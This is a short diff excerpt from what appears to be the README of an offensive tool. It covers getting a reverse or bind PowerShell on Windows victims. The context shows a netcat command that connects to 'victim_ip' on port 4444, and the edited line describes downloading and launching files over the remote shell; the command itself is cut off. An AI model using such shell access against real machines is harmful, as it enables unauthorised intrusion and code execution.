@@ -95,8 +95,8 @@ $netcat -v victim_ip 4444
 ### Win >= 7 Bind reverse shell \[ powershell.exe \]
 
 <img src="https://zupimages.net/up/19/01/wq32.png">
- 
-After to be connected to the powershell, you can download and launch some file with this method :
+
+After get a reverse powershell, you can download and lauch somes files with this trick, just using all power of Windows shell with wget command.
  
 ```
 [ powershell command ]
